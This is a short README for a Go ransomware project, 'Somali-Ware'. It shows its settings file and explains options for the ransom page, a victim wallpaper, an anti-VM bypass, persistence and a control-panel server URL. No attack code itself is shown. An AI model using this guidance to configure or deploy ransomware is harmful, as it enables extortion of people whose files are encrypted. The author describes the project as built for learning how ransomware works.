# Somali-Ware basic demonstration.

All settings are in the file under the path src\settings\settings.go 

``` Go
package settings

var (
	Key             = []byte("")
	EncryptedKey    = string("")
	HTML_CODE       = ``
	Wallpaper_Image = ``
	Testing         = false
	Bypass          = false
	Persistance     = false
	URL             = "YOUR_URL_HERE"
)
```

Here are what the following settings do.

- Key shouldn't be changed
- EncryptedKey shouldn't be changed
- HTML_CODE is the base64 (utf-8) encoded base64 you want to display when the user attempts to open a .somali file.
- Wallpaper_Image is the base64 encoded image of the wallpaper you want the user to have.
- Testing is a boolean that when enabled will NOT rewrite any files on their computer.
- Bypass will bypass the anti vm.
- URL is the server URL that you need to provide for the panel. (It should look like https://YOUR_URL:YOUR_PORT)

## Notes

This project was made completely for learning how ransome-ware works and seeing how threat actors are able to encrypt files fast and effectively on a computer. I have 0 plans to support this project any further for the fact that it was just for fun.

### DISCLAIMER

I'm not responsable for nothing lol.